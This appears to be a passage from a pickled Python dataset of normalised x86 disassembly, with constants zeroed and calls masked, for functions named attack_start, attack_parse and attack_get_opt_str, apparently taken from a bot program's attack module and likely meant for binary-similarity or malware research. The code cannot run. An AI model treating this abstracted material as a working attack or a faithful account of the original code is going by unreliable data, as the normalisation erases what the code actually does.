H~EAX\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nMOV~EAX,[ESP+0]\nPUSH~EAX\nPUSH~EBX\nCALL~FOO\nLEA~EDX,[ESI+EAX]\nMOV~[ESP+0],EDX\nADD~ESP,0\nCMP~[ESP+EDX+0],0\nJZ~FOO\nMOV~EDI,[ESP+0]\nLEA~EBP,[EBX+EAX]\nSUB~EDI,ESI\nPUSH~0\nSUB~EDI,EAX\nPUSH~0\nPUSH~EDI\nPUSH~EBP\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nCMP~EAX,0\nJZ~FOO\nLEA~ESI,[ESP+0]\nMOV~EAX,[ESP+0]\nADD~ESI,EAX\nCMP~EBX,0\nJLE~FOO\nSUB~EBX,0\nPUSH~0\nPUSH~0\nPUSH~EDI\nPUSH~EBP\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJLE~FOO\nPUSH~0\nPUSH~0\nPUSH~EDI\nPUSH~EBP\nCALL~FOO\nADD~ESP,0\nLEA~EBX,[EAX-0]\nLEA~EAX,[ESP+0]\nMOV~EDX,[ESP+0]\nADD~EAX,EBX\nMOV~[ESP+0],0\nMOV~[EAX+EDX-0],0\nJMP~FOO\nCMP~BYTEPTR[ESI+EBX],0\nJZ~FOO\nLEA~EAX,[EBX+0]\nMOV~[ESP+0],EAX\nSUB~ESP,0\nPUSH~ESI\nCALL~FOO\nMOV~EBX,[ESP+0]\nADD~ESP,0\nCMP~EAX,EBX\nJG~FOO\nCMP~BYTEPTR[ESI+EBX],0\nJZ~FOO\nMOV~ESI,[ESP+0]\nJMP~FOO\nMOV~ECX,[ESP+0]\nMOV~[ESP+0],0\nMOV~EBP,[ECX+0]\nTEST~EBP,EBP\nJLE~FOO\nXOR~EAX,EAX\nSHL~EAX,0\nPUSH~EDI\nPUSH~EBX\nMOV~EDX,[ESP+0]\nLEA~EAX,[EAX+EDX+0]\nPUSH~EAX\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nTEST~AL,AL\nJNZ~FOO\nMOV~EAX,[ESP+0]\nMOV~ECX,[ESP+0]\nINC~EAX\nMOV~[ESP+0],EAX\nCMP~[ECX+0],EAX\nJG~FOO\nSUB~ESP,0\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJG~FOO\nPUSH~ECX\nPUSH~ECX\nPUSH~ESI\nMOV~EDX,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~EAX,[EDX+0]\nSHL~EAX,0\nLEA~EAX,[EAX+ECX+0]\nPUSH~EAX\nCALL~FOO\nMOV~EAX,[ESP+0]\nADD~ESP,0\nMOV~EDX,[EAX+0]\nINC~EDX\nMOV~[EAX+0],EDX\nJMP~FOO\nINC~EAX\nLEA~ECX,[ESI+EAX]\nMOV~[ESP+0],ECX\nJMP~FOO\nMOV~EAX,[ESI-0]\nMOV~EDX,EAX\nAND~EAX,0\nSHR~EDX,0\nBTS~[ESP+EDX*4+0],EAX\nMOV~EAX,[ESI-0]\nCMP~EAX,[ESP+0]\nJLE~FOO\nJMP~FOO\nPUSH~EDI\nPUSH~EDI\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nMOV~ESI,[ESP+0]\nPUSH~ESI\nLEA~ECX,[ESP+0]\nPUSH~ECX\nCALL~FOO\nADD~ESP,0\nINC~EAX\nJZ~FOO\nPUSH~EBX\nPUSH~EBX\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nMOV~ECX,[ESP+0]\nPUSH~ECX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nCMP~[ESP+EAX+0],0\nSETZ~AL\nLEA~ESI,[ESP+0]\nAND~EAX,0\nPUSH~0\nPUSH~0\nADD~EBX,EAX\nMOV~EAX,[ESP+0]\nSUB~EAX,EBX\nADD~ESI,EBX\nPUSH~EAX\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nMOV~EDX,EAX\nCMP~EAX,0\nJZ~FOO\nCMP~EAX,0\nJLE~FOO\nSUB~EDX,0\nLEA~EAX,[ESP+0]\nADD~EAX,EBX\nLEA~EBX,[EDX+0]\nMOV~[EAX+EDX-0],0\nPUSH~0\nPUSH~0\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nCMP~BYTEPTR[ESI],0\nJZ~FOO\nMOV~EDX,[ESP+0]\nMOV~[EDX-0],0\nJMP~FOO\nCALL~FOO\nMOV~ECX,[ESP+0]\nMOV~EDX,[ESP+0]\nMOV~EBP,ECX\nADD~EBP,0\nMOV~EDI,EAX\nLEA~ESI,[ECX+0]\nCMP~[EDX+0],0\nJZ~FOO\nMOV~EAX,[ESP+0]\nMOV~DWORDPTR[EDI],0\nMOV~EDX,[EAX+0]\nMOV~EAX,0\nSUB~EAX,EDX\nPUSH~0\nLEA~EDX,[ESI+EDX]\nPUSH~EAX\nPUSH~EDX\nMOV~EDX,[ESP+0]\nMOV~EAX,[EDX-0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJZ~FOO\nCMP~EAX,0\nJZ~FOO\nMOV~EDX,[ESP+0]\nMOV~ECX,[EDX+0]\nADD~ECX,EAX\nMOV~[EDX+0],ECX\nMOV~ECX,[ESP+0]\nMOV~[EDX-0],ECX\nJMP~FOO\nMOV~EDX,[EDX+0]\nMOV~EBX,EAX\nCMP~EAX,EDX\nJLE~FOO\nMOV~EBX,EDX\nMOV~EDX,[ESP+0]\nSUB~EAX,EBX\nMOV~[EDX+0],EAX\nCMP~DWORDPTR[EDX],0\nJZ~FOO\nMOV~ECX,[ESP+0]\nMOV~EAX,[ECX+0]\nTEST~EAX,EAX\nJNZ~FOO\nCMP~[ECX+0],0\nJZ~FOO\nMOV~ECX,[ESP+0]\nMOV~EAX,[ECX+0]\nSUB~EAX,EBX\nMOV~[ECX+0],EAX\nTEST~EAX,EAX\nJZ~FOO\nTEST~EBX,EBX\nJZ~FOO\nMOV~EDX,[ESP+0]\nMOV~EAX,[EDX+0]\nSUB~EAX,EBX\nMOV~[EDX+0],EAX\nPUSH~EDX\nPUSH~EAX\nLEA~EAX,[ESI+EBX]\nPUSH~EAX\nPUSH~ESI\nCALL~FOO\nMOV~ECX,[ESP+0]\nMOV~EDX,[ESP+0]\nMOV~EAX,[ECX+0]\nADD~ESP,0\nTEST~EAX,EAX\nMOV~[EAX+EDX+0],0\nJZ~FOO\nMOV~EDX,[ESP+0]\nMOV~EAX,[EDX+0]\nTEST~EAX,EAX\nJG~FOO\nXOR~EBX,EBX\nJMP~FOO\nMOV~EAX,[ESP+0]\nCMP~[EAX-0],0\nJNZ~FOO\nMOV~EDX,[ESP+0]\nCMP~[EDX+0],0\nJNZ~FOO\nPUSH~EAX\nPUSH~0\nMOV~EAX,[ESP+0]\nADD~EAX,0\nPUSH~EAX\nPUSH~ESI\nCALL~FOO\nMOV~ECX,[ESP+0]\nMOV~EAX,[ECX+0]\nADD~ESP,0\nSUB~EAX,0\nMOV~[ECX+0],EAX\nJMP~FOO\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nPUSH~0\nCALL~FOO\nPUSH~0\nPUSH~EAX\nMOV~ECX,[ESP+0]\nMOV~EAX,[ECX+0]\nPUSH~EAX\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nINC~EAX\nJZ~FOO\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nPUSH~0\nCALL~FOO\nPUSH~0\nPUSH~EAX\nMOV~EAX,[ESP+0]\nMOV~EAX,[EAX+0]\nPUSH~EAX\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~0\nMOV~EDX,[ESP+0]\nMOV~EBX,EAX\nLEA~EDI,[ESI+EAX]\nMOV~EAX,[EDX+0]\nSUB~EAX,EBX\nPUSH~EAX\nPUSH~EDI\nCALL~FOO\nMOV~ECX,[ESP+0]\nADD~EBX,EAX\nMOV~[ESP+0],EBX\nADD~ESP,0\nMOV~[EBX+ECX+0],0\nMOV~EAX,[ESP+0]\nCMP~[EAX+0],0\nJLE~FOO\nMOV~EDX,[ESP+0]\nMOV~[EDX+0],0\nMOV~[EDX-0],0\nJMP~FOO\nPUSH~0\nPUSH~0\nMOV~EAX,[ECX+0]\nPUSH~EAX\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nINC~EAX\nJZ~FOO\nPUSH~0\nPUSH~0\nMOV~EAX,[ESP+0]\nMOV~EBX,[EAX+0]\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nMOV~EDX,[ESP+0]\nMOV~EBX,EAX\nMOV~[EAX+EDX+0],0\nPUSH~0\nPUSH~0\nPUSH~EAX\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nINC~EAX\nJZ~FOO\nPUSH~0\nPUSH~0\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nMOV~ECX,[ESP+0]\nADD~ESP,0\nMOV~[EAX+ECX+0],0\nPUSH~ECX\nPUSH~ECX\nPUSH~0\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJZ~FOO\nMOV~EDX,[ESP+0]\nADD~EAX,0\nMOV~[EDX+0],EAX\nJMP~FOO\nMOV~EAX,[ESI-0]\nMOV~EDX,EAX\nAND~EAX,0\nSHR~EDX,0\nBTS~[ESP+EDX*4+0],EAX\nMOV~EAX,[ESI-0]\nCMP~EAX,[ESP+0]\nJLE~FOO\nJMP~FOO\nPUSH~EDI\nPUSH~EDI\nPUSH~ESI\nMOV~EBX,[ESP+0]\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nCALL~FOO\nMOV~EBX,EAX\nMOV~DWORDPTR[EBX],0\nPUSH~0\nPUSH~0\nLEA~ECX,[ESP+0]\nPUSH~ECX\nMOV~EAX,[ESP+0]\nMOV~ESI,[EAX-0]\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJZ~FOO\nINC~EAX\nJNZ~FOO\nCMP~DWORDPTR[EBX],0\nJZ~FOO\nSUB~ESP,0\nMOV~EDX,[ESP+0]\nMOV~ECX,[EDX-0]\nPUSH~ECX\nCALL~FOO\nMOV~ECX,[ESP+0]\nADD~ESP,0\nMOV~[ECX-0],0\nMOV~[ECX-0],0\nJMP~FOO\nMOV~EAX,[ESI-0]\nMOV~EDX,EAX\nAND~EAX,0\nSHR~EDX,0\nBTS~[ESP+EDX*4+0],EAX\nMOV~EAX,[ESI-0]\nCMP~EAX,[ESP+0]\nJLE~FOO\nJMP~FOO\nPUSH~EDI\nPUSH~EDI\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nMOV~ESI,[ESP+0]\nPUSH~ESI\nLEA~ECX,[ESP+0]\nPUSH~ECX\nCALL~FOO\nADD~ESP,0\nINC~EAX\nJZ~FOO\nPUSH~EBX\nPUSH~EBX\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nMOV~ECX,[ESP+0]\nPUSH~ECX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nCMP~[ESP+EAX+0],0\nSETZ~AL\nLEA~ESI,[ESP+0]\nAND~EAX,0\nPUSH~0\nPUSH~0\nADD~EBX,EAX\nMOV~EAX,[ESP+0]\nSUB~EAX,EBX\nADD~ESI,EBX\nPUSH~EAX\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nMOV~EDI,EAX\nCMP~EAX,0\nJZ~FOO\nCMP~EAX,0\nJLE~FOO\nSUB~EDI,0\nLEA~EAX,[ESP+0]\nMOV~[ESP+0],0\nADD~EAX,EBX\nMOV~EDX,ESI\nMOV~[EAX+EDI-0],0\nMOV~CL,[ESI]\nLEA~EAX,[ECX-0]\nCMP~AL,0\nJA~FOO\nXOR~EDX,EDX\nINC~EDX\nMOV~[ESP+0],EDX\nMOV~CL,[EDX+ESI]\nLEA~EAX,[ECX-0]\nCMP~AL,0\nJBE~FOO\nLEA~EDX,[ESI+EDX]\nTEST~CL,CL\nJZ~FOO\nMOV~BYTEPTR[EDX],0\nMOV~EDX,[ESP+0]\nLEA~EAX,[EDX+0]\nMOV~[ESP+0],EAX\nCMP~BYTEPTR[ESI+EAX],0\nJZ~FOO\nSUB~ESP,0\nMOV~EAX,ESI\nMOV~EDX,[ESP+0]\nADD~EAX,EDX\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~EAX\nMOV~EBP,[ESP+0]\nMOV~EAX,ESI\nADD~EAX,EBP\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nINC~EAX\nJZ~FOO\nSUB~ESP,0\nMOV~EAX,ESI\nMOV~EBX,[ESP+0]\nADD~EAX,EBX\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~EAX\nMOV~ECX,[ESP+0]\nMOV~EAX,ESI\nADD~EAX,ECX\nPUSH~EAX\nCALL~FOO\nMOV~EDX,[ESP+0]\nADD~EDX,EAX\nMOV~[ESP+0],EDX\nADD~ESP,0\nMOV~EAX,[ESP+0]\nCMP~BYTEPTR[ESI+EAX],0\nJZ~FOO\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nMOV~EDX,EAX\nLEA~EAX,[EAX-0]\nCMP~EAX,0\nJA~FOO\nMOV~EBX,[ESP+0]\nADD~EBX,EDX\nJMP~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nCMP~EAX,EBX\nJB~FOO\nMOV~EAX,[ESP+0]\nMOV~EBX,ESI\nSUB~ESP,0\nADD~EBX,EAX\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~EAX\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nCMP~BYTEPTR[EBX],0\nJZ~FOO\nMOV~EDX,[ESP+0]\nMOV~[EDX+0],0\nMOV~ECX,[ESP+0]\nMOV~[ECX-0],0\nJMP~FOO\nMOV~EAX,[ESP+0]\nMOV~[EAX+0],0\nJMP~FOO\nPUSH~0\nPUSH~0\nMOV~ECX,[ESP+0]\nPUSH~ECX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOV~EBX,[ESP+0]\nMOV~ESI,EAX\nADD~EBX,0\nPOP~EAX\nPOP~EDX\nPUSH~0\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nTEST~AL,AL\nJZ~FOO\nMOV~EDX,[ESP+0]\nMOV~[EDX-0],0\nPUSH~0\nPUSH~ESI\nLEA~EAX,[ESP+0]\nPUSH~EAX\nMOV~EDX,[ESP+0]\nMOV~EAX,[EDX-0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nCMP~[ESP+0],0\nJLE~FOO\nJMP~FOO\nMOV~[ECX-0],0\nJMP~FOO\nMOV~DWORDPTR[EBX],0\nJMP~FOO\nCMP~DWORDPTR[EDI],0\nJNZ~FOO\nJMP~FOO\nMOV~[ESP+0],0\nCMP~[ESI+0],0\nJZ~FOO\nMOV~EAX,[ESP+0]\nPUSH~EDX\nSUB~EBX,EAX\nLEA~EAX,[ESI+EAX]\nPUSH~EBX\nPUSH~EAX\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],0\nMOV~AL,[ESI]\nADD~ESP,0\nTEST~AL,AL\nJZ~FOO\nMOV~ECX,ESI\nCMP~AL,0\nJZ~FOO\nMOV~EAX,0\nJMP~FOO\nINC~EAX\nCMP~DL,0\nJZ~FOO\nLEA~ECX,[EAX+ESI]\nMOV~[ESP+0],EAX\nMOV~DL,[ECX]\nTEST~DL,DL\nJNZ~FOO\nSUB~ESP,0\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJLE~FOO\nSUB~ESP,0\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJG~FOO\nPUSH~EAX\nPUSH~EAX\nPUSH~ESI\nMOV~EAX,[ESP+0]\nADD~EAX,0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nSUB~ESP,0\nMOV~EAX,ESI\nMOV~EBP,[ESP+0]\nADD~EAX,EBP\nINC~EAX\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJG~FOO\nMOV~EBX,[ESP+0]\nPUSH~EDI\nADD~EBX,0\nPUSH~EDI\nPUSH~0\nPUSH~EBX\nCALL~FOO\nPOP~ECX\nMOV~EAX,ESI\nMOV~EDX,[ESP+0]\nADD~EAX,EDX\nINC~EAX\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJLE~FOO\nPUSH~EAX\nPUSH~EAX\nMOV~EBP,[ESP+0]\nADD~ESI,EBP\nLEA~EAX,[ESI+0]\nPUSH~EAX\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nMOV~ECX,[ESP+0]\nCMP~[ECX-0],0\nJZ~FOO\nMOV~[ECX-0],0\nJMP~FOO\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nTEST~AL,AL\nJNZ~FOO\nCMP~[ESP+0],ESI\nMOV~ECX,[ESP+0]\nSETNLE~AL\nLEA~EAX,[EAX+EAX*8+0]\nMOV~[ECX-0],AL\nJMP~FOO\nMOV~BYTEPTR[ECX],0\nJMP~FOO\nMOV~EBX,[ESP+0]\nPUSH~EBP\nADD~EBX,0\nPUSH~EBP\nPUSH~0\nPUSH~EBX\nCALL~FOO\nPOP~EDI\nMOV~EAX,ESI\nMOV~ECX,[ESP+0]\nADD~EAX,ECX\nINC~EAX\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJLE~FOO\nSUB~ESP,0\nMOV~EAX,ESI\nMOV~EDX,[ESP+0]\nADD~EAX,EDX\nINC~EAX\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJG~FOO\nJMP~FOO\nMOV~BYTEPTR[ECX],0\nSUB~ESP,0\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJLE~FOO\nSUB~ESP,0\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJG~FOO\nPUSH~EAX\nPUSH~EAX\nPUSH~EBX\nMOV~EAX,[ESP+0]\nADD~EAX,0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nSUB~ESP,0\nMOV~EAX,EBX\nMOV~EBP,[ESP+0]\nADD~EAX,EBP\nINC~EAX\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJG~FOO\nMOV~ESI,[ESP+0]\nPUSH~EDI\nADD~ESI,0\nPUSH~EDI\nPUSH~0\nPUSH~ESI\nCALL~FOO\nPOP~ECX\nMOV~EAX,EBX\nMOV~EDX,[ESP+0]\nADD~EAX,EDX\nINC~EAX\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJLE~FOO\nPUSH~EBP\nPUSH~EBP\nMOV~EDI,[ESP+0]\nADD~EBX,EDI\nLEA~EAX,[EBX+0]\nPUSH~EAX\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nMOV~[ESP+0],0\nJMP~FOO\nSUB~ESP,0\nPUSH~EDI\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJG~FOO\nPUSH~EAX\nPUSH~EAX\nPUSH~EDI\nMOV~EDX,[ESP+0]\nMOV~EAX,[EDX+0]\nSHL~EAX,0\nLEA~EAX,[EBP+EAX+0]\nPUSH~EAX\nCALL~FOO\nMOV~ECX,[ESP+0]\nMOV~EBX,[ECX+0]\nSHL~EBX,0\nLEA~EBX,[EBP+EBX+0]\nMOV~[ESP],EBX\nCALL~FOO\nPOP~ECX\nADD~EBX,EAX\nPOP~EDI\nPUSH~0\nPUSH~EBX\nCALL~FOO\nMOV~EBX,[ESP+0]\nPUSH~0\nPUSH~0\nMOV~EDX,[ESP+0]\nADD~EBX,0\nADD~ESI,EBX\nMOV~EAX,[EDX+0]\nSUB~EAX,EBX\nPUSH~EAX\nPUSH~ESI\nCALL~FOO\nMOV~EDX,[ESP+0]\nADD~EBX,EDX\nMOV~[EBX+EAX+0],0\nMOV~ECX,[ESP+0]\nADD~ESP,0\nMOV~EBX,[ECX+0]\nSHL~EBX,0\nLEA~EBX,[EBP+EBX+0]\nPUSH~EBX\nCALL~FOO\nPOP~ECX\nADD~EBX,EAX\nPOP~EDI\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~EAX,[ESP+0]\nMOV~EDX,[EAX+0]\nADD~ESP,0\nINC~EDX\nMOV~[EAX+0],EDX\nJMP~FOO\nMOV~EAX,[ESP+0]\nMOV~[EAX-0],0\nJMP~FOO\nMOV~[ESP+0],0\nCMP~[EBX+0],0\nJNZ~FOO\nMOV~[ESP+0],0\nMOV~EDX,[ESP+0]\nPUSH~EAX\nLEA~EAX,[EDI+0]\nSUB~EAX,EDX\nLEA~EDX,[EBX+EDX]\nPUSH~EAX\nPUSH~EDX\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],0\nADD~ESP,0\nMOV~AL,[EBX]\nTEST~AL,AL\nJZ~FOO\nMOV~ECX,EBX\nCMP~AL,0\nJZ~FOO\nMOV~EAX,0\nJMP~FOO\nINC~EAX\nCMP~DL,0\nJZ~FOO\nLEA~ECX,[EBX+EAX]\nMOV~[ESP+0],EAX\nMOV~DL,[ECX]\nTEST~DL,DL\nJNZ~FOO\nJMP~FOO\nLEA~EAX,[EDX+0]\nMOV~[ESP+0],EAX\nJMP~FOO\nLEA~EBX,[EAX+0]\nMOV~[ESP+0],EBX\nSUB~ESP,0\nLEA~EBX,[ESI+EBX]\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nCMP~[EBX+EAX-0],0\nJNZ~FOO\nMOV~EAX,[ESP+0]\nMOV~EBX,ESI\nSUB~ESP,0\nADD~EBX,EAX\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nMOV~[EBX+EAX-0],0\nJMP~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nPOP~EBX\nPOP~EDI\nPUSH~0\nPUSH~0\nCALL~FOO\nPOP~EDX\nPOP~ECX\nPUSH~EAX\nLEA~EAX,[ESI+0]\nPUSH~EAX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nPUSH~EAX\nMOV~EAX,[ESP+0]\nINC~EBP\nPUSH~EAX\nADD~ESI,0\nMOV~EDI,[ESP+0]\nPUSH~EDI\nCALL~FOO\nADD~ESP,0\nCMP~[ESP+0],EBP\nJNZ~FOO\nLEA~EDX,[ESP+0]\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EDX\nMOV~EDX,[ESP+0]\nLEA~ECX,[ESP+0]\nADD~EAX,0\nADD~EDX,0\nMOV~[ESP+0],ECX\nMOV~[ESP+0],EAX\nMOV~[ESP+0],EDX\nJMP~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nPOP~EBX\nPOP~EDI\nPUSH~0\nPUSH~0\nCALL~FOO\nPOP~EDX\nPOP~ECX\nPUSH~EAX\nLEA~EAX,[ESI+0]\nPUSH~EAX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nPOP~EBX\nPOP~EDI\nPUSH~0\nPUSH~0\nCALL~FOO\nPOP~EDX\nPOP~ECX\nPUSH~EAX\nLEA~EAX,[ESI+0]\nPUSH~EAX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nPOP~EBX\nPOP~EDI\nPUSH~0\nPUSH~0\nCALL~FOO\nPOP~EDX\nPOP~ECX\nPUSH~EAX\nLEA~EAX,[ESI+0]\nPUSH~EAX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nPOP~EBX\nPOP~EDI\nPUSH~0\nPUSH~0\nCALL~FOO\nPOP~EDX\nPOP~ECX\nPUSH~EAX\nLEA~EAX,[ESI+0]\nPUSH~EAX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nADD~ESP,0\nJMP~FOO"'
p14
L7943L
tp15
a(S'attack_get_opt_str'
p16
S'"PUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~AL,[ESP+0]\nMOV~EBX,[ESP+0]\nMOV~[ESP+0],AL\nMOV~AL,[ESP+0]\nAND~EAX,0\nMOV~ESI,EAX\nTEST~EAX,EAX\nJLE~FOO\nMOV~AL,[ESP+0]\nCMP~AL,[EBX+0]\nJZ~FOO\nLEA~EDX,[EBX+0]\nXOR~ECX,ECX\nJMP~FOO\nMOV~AL,[EDX+0]\nMOV~EBX,EDX\nADD~EDX,0\nCMP~AL,[ESP+0]\nJZ~FOO\nINC~ECX\nCMP~ECX,ESI\nJNZ~FOO\nMOV~EAX,[ESP+0]\nPOP~EDX\nPOP~EBX\nPOP~ESI\nRETN\nMOV~EBX,[EBX]\nMOV~[ESP+0],EBX\nMOV~EAX,[ESP+0]\nPOP~EDX\nPOP~EBX\nPOP~ESI\nRETN"'
p17
L89L
tp18
a(S'attack_start'
p19
S'"PUSH~EBP\nMOV~EBP,ESP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~BL,[EBP+0]\nMOVZX~EDI,[EBP+0]\nMOVZX~ESI,[EBP+0]\nCALL~FOO\nCMP~EAX,0\nJZ~FOO\nTEST~EAX,EAX\nJLE~FOO\nLEA~ESP,[EBP-0]\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN\nCALL~FOO\nCMP~EAX,0\nJZ~FOO\nTEST~EAX,EAX\nJNZ~FOO\nSUB~ESP,0\nMOV~EAX,[EBP+0]\nPUSH~EAX\nCALL~FOO\nCALL~FOO\nPOP~ESI\nPOP~EDI\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~EAX,ESI\nMOV~EBX,[EBP+0]\nAND~EAX,0\nPUSH~EBX\nPUSH~EAX\nMOV~EAX,EDI\nMOV~ECX,[EBP+0]\nAND~EAX,0\nPUSH~ECX\nPUSH~EAX\nCALL~DWORDPTR[EDX]\nADD~ESP,0\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nXOR~EAX,EAX\nMOV~AL,<STR>\nMOV~[EBP-0],EAX\nTEST~EAX,EAX\nJLE~FOO\nMOV~ECX,<STR>\nXOR~EAX,EAX\nMOV~EDX,[ECX]\nCMP~BL,[EDX+0]\nJNZ~FOO\nJMP~FOO\nMOV~EDX,[ECX+EAX*4]\nCMP~[EDX+0],BL\nJZ~FOO\nINC~EAX\nCMP~EAX,[EBP-0]\nJNZ~FOO\nJMP~FOO"'
p20
L192L
tp21
a(S'attack_parse'
p22
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~EBX,[ESP+0]\nMOV~ESI,[ESP+0]\nCMP~EBX,0\nJA~FOO\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN\nMOV~EBP,[ESI]\nROR~BP,0\nROR~EBP,0\nROR~BP,0\nCMP~EBX,0\nJZ~FOO\nMOV~AL,[ESI+0]\nCMP~EBX,0\nMOV~[ESP+0],AL\nJZ~FOO\nMOV~AL,[ESI+0]\nTEST~AL,AL\nJZ~FOO\nAND~EAX,0\nLEA~EDX,[EBX-0]\nMOV~[ESP+0],EAX\nMOV~[ESP+0],EDX\nLEA~EAX,[EAX+EAX*4]\nMOV~[ESP+0],EAX\nCMP~EDX,EAX\nJB~FOO\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nLEA~EDI,[ESI+0]\nMOV~ECX,[ESP+0]\nPUSH~ECX\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nMOV~EDX,[ESP+0]\nTEST~EDX,EDX\nJLE~FOO\nMOV~EDX,[ESP+0]\nMOV~ECX,EAX\nLEA~ESI,[ESI+EDX+0]\nLEA~ESI,[ESI+0]\nMOV~EDX,[EDI]\nMOV~[ECX+0],EDX\nMOV~AL,[EDI+0]\nADD~EDI,0\nMOV~[ECX+0],AL\nMOV~WORDPTR[ECX],0\nMOV~[ECX+0],EDX\nADD~ECX,0\nCMP~ESI,EDI\nJNZ~FOO\nMOV~ESI,[ESP+0]\nLEA~EAX,[ESI+ESI*4]\nSUB~EBX,EAX\nSUB~EBX,0\nMOV~[ESP+0],EBX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],0\nTEST~EAX,EAX\nJZ~FOO\nMOV~AL,[EDI]\nMOV~[ESP+0],AL\nTEST~AL,AL\nJNZ~FOO\nMOV~[ESP+0],0\nCALL~FOO\nMOV~DWORDPTR[EAX],0\nPUSH~EBX\nPUSH~EBX\nMOV~ECX,[ESP+0]\nPUSH~ECX\nMOV~EDX,[ESP+0]\nPUSH~EDX\nMOV~EAX,[ESP+0]\nPUSH~EAX\nMOV~EAX,[ESP+0]\nPUSH~